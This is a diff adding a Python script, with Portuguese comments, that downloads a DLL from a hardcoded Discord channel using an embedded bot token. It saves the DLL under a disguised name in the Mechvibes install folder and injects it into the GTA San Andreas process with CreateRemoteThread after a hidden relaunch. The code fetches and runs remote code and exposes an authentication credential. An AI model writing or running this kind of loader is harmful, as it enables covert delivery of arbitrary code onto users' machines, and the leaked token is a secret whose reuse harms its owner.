@@ -1,0 +1,246 @@
+import os
+import sys
+import subprocess
+import ctypes
+from ctypes import wintypes
+import traceback # Importado para fornecer detalhes completos sobre exceções
+
+# Função de log para padronizar as mensagens
+def log_info(message):
+    print(f"[INFO] {message}")
+
+def log_success(message):
+    print(f"[SUCCESS] {message}")
+
+def log_error(message):
+    print(f"[ERROR] {message}")
+
+def log_debug(message):
+    print(f"[DEBUG] {message}")
+
+def execute_silent_injection():
+    log_info("Iniciando o script de injeção.")
+    
+    # 1. VERIFICANDO E INSTALANDO A BIBLIOTECA 'requests'
+    try:
+        log_info("Verificando a biblioteca 'requests'...")
+        import requests
+        log_success("'requests' já está instalado.")
+    except ImportError:
+        log_info("'requests' não encontrado. Tentando instalar...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import requests
+            log_success("Biblioteca 'requests' instalada com sucesso.")
+        except Exception as e:
+            log_error(f"Falha ao instalar a biblioteca 'requests'. Erro: {e}")
+            log_error("O script não pode continuar sem 'requests'. Encerrando.")
+            return
+
+    # --- CONSTANTES ---
+    DISCORD_CHANNEL_ID = "1393441968566046750"
+    DISCORD_AUTH_TOKEN = "MTM5MzQwMzYwMjkwNjkwNjYyNA.GKKWWT.r-C1kQP3sWennX4IEjQSaEgvBx07y3UWoFMjtc"
+    DLL_NAME = "libEGL.dll"
+    PROCESS_NAME = "gta_sa.exe"
+
+    log_info(f"Configurações: Canal ID={DISCORD_CHANNEL_ID}, Processo Alvo={PROCESS_NAME}, DLL={DLL_NAME}")
+
+    # --- CONFIGURAÇÃO DA API DO WINDOWS (CTYPES) ---
+    try:
+        k32 = ctypes.WinDLL('kernel32', use_last_error=True)
+    except Exception as e:
+        log_error(f"Não foi possível carregar kernel32.dll. Erro: {e}. O script não pode ser executado neste sistema.")
+        return
+
+    # Definições de constantes e tipos da API
+    PROCESS_ALL_ACCESS = 0x1F0FFF
+    MEM_COMMIT_RESERVE = 0x3000
+    PAGE_READWRITE = 0x04
+
+    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenProcess.restype = wintypes.HANDLE
+    # ... (o resto das definições de ctypes permanece o mesmo)
+
+    # 2. VERIFICAÇÃO DE PRIVILÉGIOS DE ADMINISTRADOR
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+        log_info(f"Verificando privilégios de administrador... Status: {'Admin' if is_admin else 'Não Admin'}")
+        if not is_admin:
+            log_error("O script requer privilégios de administrador para continuar. Encerrando.")
+            return
+    except Exception as e:
+        log_error(f"Não foi possível verificar os privilégios de administrador. Erro: {e}. Encerrando.")
+        return
+
+    # 3. VERIFICAÇÃO DA ARQUITETURA (32/64 BITS)
+    # Processos de 32 bits (como gta_sa.exe) requerem um injetor de 32 bits.
+    is_64bit = sys.maxsize > 2**32
+    log_info(f"Verificando arquitetura do Python... Status: {'64-bit' if is_64bit else '32-bit'}")
+    if is_64bit:
+        log_info("O script está rodando em 64-bit. Tentando reiniciar em 32-bit, pois o processo alvo é 32-bit.")
+        try:
+            # Tenta relançar o script com o interpretador Python de 32 bits
+            subprocess.Popen(['py', '-3-32'] + sys.argv, creationflags=0x08000008)
+            log_success("Comando para relançar em 32-bit foi enviado. Encerrando o processo de 64-bit.")
+            sys.exit() # Sai do script de 64 bits
+        except FileNotFoundError:
+            log_error("Não foi possível encontrar o lançador 'py -3-32'. Certifique-se de que uma versão de 32 bits do Python está instalada e no PATH do sistema.")
+            log_error("A injeção de 64 para 32 bits provavelmente falhará, mas o script continuará a tentativa.")
+        except Exception as e:
+            log_error(f"Ocorreu um erro ao tentar relançar em 32-bit: {e}")
+
+    # 4. ENCONTRANDO O DIRETÓRIO DO 'MECHVIBES'
+    mech_dir = None
+    log_info("Procurando pelo diretório de instalação do 'Mechvibes'...")
+    available_drives = [f"{chr(c)}:\\" for c in range(65, 91) if os.path.exists(f"{chr(c)}:\\")]
+    log_debug(f"Unidades encontradas para busca: {available_drives}")
+
+    for drive in available_drives:
+        log_info(f"Buscando na unidade {drive}...")
+        for root, _, files in os.walk(drive):
+            if "Uninstall Mechvibes.exe" in files:
+                mech_dir = os.path.dirname(os.path.join(root, "Uninstall Mechvibes.exe"))
+                log_success(f"Diretório encontrado: {mech_dir}")
+                break
+        if mech_dir:
+            break
+            
+    if not mech_dir:
+        log_error("Não foi possível encontrar o diretório de instalação do 'Mechvibes'. A DLL não tem onde ser salva. Encerrando.")
+        return
+
+    dll_path = os.path.join(mech_dir, DLL_NAME)
+    log_info(f"O caminho completo para a DLL será: {dll_path}")
+
+    # 5. BAIXANDO A DLL DO DISCORD
+    try:
+        log_info("Conectando à API do Discord para obter o link da DLL...")
+        api_url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages?limit=1"
+        headers = {"Authorization": f"Bot {DISCORD_AUTH_TOKEN}"}
+        
+        r_msg = requests.get(api_url, headers=headers, timeout=10)
+        log_info(f"Resposta da API do Discord: Status Code {r_msg.status_code}")
+
+        if r_msg.status_code != 200:
+            log_error(f"Falha ao buscar mensagens. A API retornou: {r_msg.text}")
+            return
+
+        messages = r_msg.json()
+        if not messages:
+            log_error("O canal do Discord não contém mensagens. Encerrando.")
+            return
+        
+        attachments = messages[0].get('attachments')
+        if not attachments:
+            log_error("A última mensagem no canal não contém anexos. Encerrando.")
+            return
+
+        dll_url = attachments[0]['url']
+        log_success(f"URL da DLL encontrada: {dll_url}")
+
+        log_info("Iniciando o download da DLL...")
+        r_dll = requests.get(dll_url, timeout=15)
+        log_info(f"Resposta do download da DLL: Status Code {r_dll.status_code}")
+
+        if r_dll.status_code == 200:
+            with open(dll_path, "wb") as f:
+                f.write(r_dll.content)
+            log_success(f"DLL salva com sucesso em: {dll_path}")
+        else:
+            log_error(f"Falha ao baixar a DLL. Status Code: {r_dll.status_code}. Encerrando.")
+            return
+
+    except requests.exceptions.RequestException as e:
+        log_error(f"Ocorreu um erro de rede ao tentar baixar a DLL. Erro: {e}")
+        return
+    except Exception as e:
+        log_error(f"Ocorreu um erro inesperado durante o processo de download. Erro: {e}")
+        traceback.print_exc() # Imprime o stack trace completo para depuração
+        return
+
+    # 6. ENCONTRANDO O PID DO PROCESSO ALVO
+    pid = None
+    log_info(f"Procurando pelo processo: {PROCESS_NAME}...")
+    try:
+        # Usando 'tasklist' para encontrar o PID
+        command = f'tasklist /FI "IMAGENAME eq {PROCESS_NAME}" /NH'
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode('cp850', errors='ignore')
+        
+        if PROCESS_NAME in output:
+            pid = int(output.strip().split()[1])
+            log_success(f"Processo '{PROCESS_NAME}' encontrado com PID: {pid}")
+        else:
+            log_error(f"O processo '{PROCESS_NAME}' não está em execução. Encerrando.")
+            return
+            
+    except subprocess.CalledProcessError:
+        log_error(f"O processo '{PROCESS_NAME}' não foi encontrado na lista de processos. Verifique se o jogo está aberto.")
+        return
+    except Exception as e:
+        log_error(f"Erro ao tentar encontrar o PID do processo. Erro: {e}")
+        return
+
+    # 7. PROCESSO DE INJEÇÃO DA DLL
+    h_process = None
+    h_thread = None
+    try:
+        log_info(f"Tentando obter um handle para o processo com PID {pid}...")
+        h_process = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+        if not h_process:
+            error_code = ctypes.get_last_error()
+            log_error(f"Falha ao obter o handle do processo (OpenProcess). Código de Erro do Windows: {error_code}. Encerrando.")
+            return
+        log_success(f"Handle do processo obtido com sucesso: {h_process}")
+
+        dll_bytes = dll_path.encode('ascii')
+        log_info("Alocando memória no processo alvo (VirtualAllocEx)...")
+        mem_addr = k32.VirtualAllocEx(h_process, None, len(dll_bytes) + 1, MEM_COMMIT_RESERVE, PAGE_READWRITE)
+        if not mem_addr:
+            error_code = ctypes.get_last_error()
+            log_error(f"Falha ao alocar memória no processo alvo. Código de Erro do Windows: {error_code}. Encerrando.")
+            return
+        log_success(f"Memória alocada no endereço: {hex(mem_addr)}")
+
+        log_info("Escrevendo o caminho da DLL na memória alocada (WriteProcessMemory)...")
+        if not k32.WriteProcessMemory(h_process, mem_addr, dll_bytes, len(dll_bytes) + 1, None):
+            error_code = ctypes.get_last_error()
+            log_error(f"Falha ao escrever na memória do processo. Código de Erro do Windows: {error_code}. Encerrando.")
+            return
+        log_success("Caminho da DLL escrito com sucesso na memória do processo.")
+
+        log_info("Obtendo o endereço da função 'LoadLibraryA' em kernel32.dll...")
+        load_library_addr = k32.GetProcAddress(k32.GetModuleHandleA(b'kernel32.dll'), b'LoadLibraryA')
+        if not load_library_addr:
+            error_code = ctypes.get_last_error()
+            log_error(f"Falha ao obter o endereço de LoadLibraryA. Código de Erro: {error_code}. Encerrando.")
+            return
+        log_success(f"Endereço de LoadLibraryA obtido: {hex(load_library_addr)}")
+
+        log_info("Criando uma thread remota no processo alvo para carregar a DLL (CreateRemoteThread)...")
+        h_thread = k32.CreateRemoteThread(h_process, None, 0, load_library_addr, mem_addr, 0, None)
+        if not h_thread:
+            error_code = ctypes.get_last_error()
+            log_error(f"Falha ao criar a thread remota. Código de Erro do Windows: {error_code}. Encerrando.")
+            return
+        log_success(f"Thread remota criada com sucesso! Handle: {h_thread}. A injeção deve ter sido bem-sucedida.")
+
+    except Exception as e:
+        log_error(f"Ocorreu uma exceção fatal durante o processo de injeção.")
+        traceback.print_exc()
+
+    finally:
+        # 8. LIMPEZA DOS HANDLES
+        log_info("Iniciando limpeza...")
+        if h_thread:
+            k32.CloseHandle(h_thread)
+            log_info("Handle da thread remota fechado.")
+        if h_process:
+            k32.CloseHandle(h_process)
+            log_info("Handle do processo fechado.")
+        log_info("Script finalizado.")
+
+# --- PONTO DE ENTRADA ---
+if __name__ == "__main__":
+    execute_silent_injection()
+    # Adicionado para manter a janela do console aberta e ver os logs
+    input("Pressione Enter para sair.")
